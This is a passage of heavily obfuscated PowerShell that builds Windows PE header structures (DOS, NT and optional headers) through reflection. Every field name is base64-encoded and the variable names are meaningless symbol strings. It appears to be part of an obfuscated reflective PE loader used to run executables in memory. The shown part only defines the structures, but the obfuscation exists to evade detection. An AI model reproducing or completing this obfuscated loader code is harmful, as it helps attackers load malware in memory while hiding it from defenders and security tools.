		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(224) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(232) | Out-Null
		${_/==\_/\/\/\_____} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value ${_/==\_/\/\/\_____}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIAMwAyAA=='))), ${/\______/====\/=\}, [System.ValueType], 224)
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${__/=\/\/\____/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(28) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${_/\_/\/\___/\____}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${/==\/\__/=\_/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(76) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(84) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(92) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		${/==\__/\/\_/=\_/=} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value ${/==\__/\/\_/=\_/=}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwA2ADQA'))), ${/\______/====\/=\}, [System.ValueType], 264)
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${_/\_/=\/==\_/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${_/==\_/\/\/\_____}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${______/\/\/\_/==\} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value ${______/\/\/\_/==\}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwAzADIA'))), ${/\______/====\/=\}, [System.ValueType], 248)
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${_/\_/=\/==\_/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${/==\__/\/\_/=\_/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/==\__/\_/\__/\_} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value ${_/==\__/\_/\__/\_}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABPAFMAXwBIAEUAQQBEAEUAUgA='))), ${/\______/====\/=\}, [System.ValueType], 64)
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQBnAGkAYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAYgBsAHAA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcgBsAGMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcABhAHIAaABkAHIA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AaQBuAGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQB4AGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwB1AG0A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGkAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAHIAbABjAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AdgBuAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
